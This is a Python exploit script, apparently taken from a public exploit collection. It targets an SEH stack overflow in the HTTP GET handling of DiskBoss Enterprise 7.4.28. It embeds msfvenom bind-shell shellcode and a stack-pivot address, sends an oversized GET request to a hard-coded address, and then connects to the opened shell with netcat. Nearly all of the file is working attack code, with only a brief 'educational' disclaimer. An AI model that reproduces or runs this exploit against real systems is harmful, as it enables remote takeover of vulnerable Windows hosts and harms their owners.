#!/usr/bin/python
import socket,os,time

#SEH Stack Overflow in GET request 
#DiskBoss Enterprise 7.4.28
#Tested on Windows XP SP3 & Windows 7 Professional
#For educational proposes only

host = "192.168.1.20"
port = 80

#badchars \x00\x09\x0a\x0d\x20
#msfvenom -a x86 --platform windows -p windows/shell_bind_tcp lport=4444 -b "\x00\x09\x0a\x0d\x20" -f python
buf =  ""
buf += "\xb8\x3c\xb1\x1e\x1d\xd9\xc8\xd9\x74\x24\xf4\x5a\x33"
buf += "\xc9\xb1\x53\x83\xc2\x04\x31\x42\x0e\x03\x7e\xbf\xfc"
buf += "\xe8\x82\x57\x82\x13\x7a\xa8\xe3\x9a\x9f\x99\x23\xf8"
buf += "\xd4\x8a\x93\x8a\xb8\x26\x5f\xde\x28\xbc\x2d\xf7\x5f"
buf += "\x75\x9b\x21\x6e\x86\xb0\x12\xf1\x04\xcb\x46\xd1\x35"
buf += "\x04\x9b\x10\x71\x79\x56\x40\x2a\xf5\xc5\x74\x5f\x43"
buf += "\xd6\xff\x13\x45\x5e\x1c\xe3\x64\x4f\xb3\x7f\x3f\x4f"
buf += "\x32\x53\x4b\xc6\x2c\xb0\x76\x90\xc7\x02\x0c\x23\x01"
buf += "\x5b\xed\x88\x6c\x53\x1c\xd0\xa9\x54\xff\xa7\xc3\xa6"
buf += "\x82\xbf\x10\xd4\x58\x35\x82\x7e\x2a\xed\x6e\x7e\xff"
buf += "\x68\xe5\x8c\xb4\xff\xa1\x90\x4b\xd3\xda\xad\xc0\xd2"
buf += "\x0c\x24\x92\xf0\x88\x6c\x40\x98\x89\xc8\x27\xa5\xc9"
buf += "\xb2\x98\x03\x82\x5f\xcc\x39\xc9\x37\x21\x70\xf1\xc7"
buf += "\x2d\x03\x82\xf5\xf2\xbf\x0c\xb6\x7b\x66\xcb\xb9\x51"
buf += "\xde\x43\x44\x5a\x1f\x4a\x83\x0e\x4f\xe4\x22\x2f\x04"
buf += "\xf4\xcb\xfa\xb1\xfc\x6a\x55\xa4\x01\xcc\x05\x68\xa9"
buf += "\xa5\x4f\x67\x96\xd6\x6f\xad\xbf\x7f\x92\x4e\xae\x23"
buf += "\x1b\xa8\xba\xcb\x4d\x62\x52\x2e\xaa\xbb\xc5\x51\x98"
buf += "\x93\x61\x19\xca\x24\x8e\x9a\xd8\x02\x18\x11\x0f\x97"
buf += "\x39\x26\x1a\xbf\x2e\xb1\xd0\x2e\x1d\x23\xe4\x7a\xf5"
buf += "\xc0\x77\xe1\x05\x8e\x6b\xbe\x52\xc7\x5a\xb7\x36\xf5"
buf += "\xc5\x61\x24\x04\x93\x4a\xec\xd3\x60\x54\xed\x96\xdd"
buf += "\x72\xfd\x6e\xdd\x3e\xa9\x3e\x88\xe8\x07\xf9\x62\x5b"
buf += "\xf1\x53\xd8\x35\x95\x22\x12\x86\xe3\x2a\x7f\x70\x0b"
buf += "\x9a\xd6\xc5\x34\x13\xbf\xc1\x4d\x49\x5f\x2d\x84\xc9"
buf += "\x6f\x64\x84\x78\xf8\x21\x5d\x39\x65\xd2\x88\x7e\x90"
buf += "\x51\x38\xff\x67\x49\x49\xfa\x2c\xcd\xa2\x76\x3c\xb8"
buf += "\xc4\x25\x3d\xe9"

#Overwrite SEH handler
stackpivot = "\x5c\x60\x04\x10" #ADD ESP,0x68 + RETN

buf_len = 5250

crash = "\x90"*20 + buf + "\x41"*(2491-20-len(buf)) + stackpivot + "\x44"*(buf_len-8-2487)

request = "GET /" + crash + "HTTP/1.1" + "\r\n"
request += "Host: " + host + "\r\n"
request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + "\r\n"
request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + "\r\n"
request += "Accept-Language: en-US,en;q=0.5" + "\r\n"
request += "Accept-Encoding: gzip, deflate" + "\r\n"
request += "Connection: keep-alive" + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(request)

s.close()

print "Waiting for shell..."
time.sleep(5)
os.system("nc " + host + " 4444")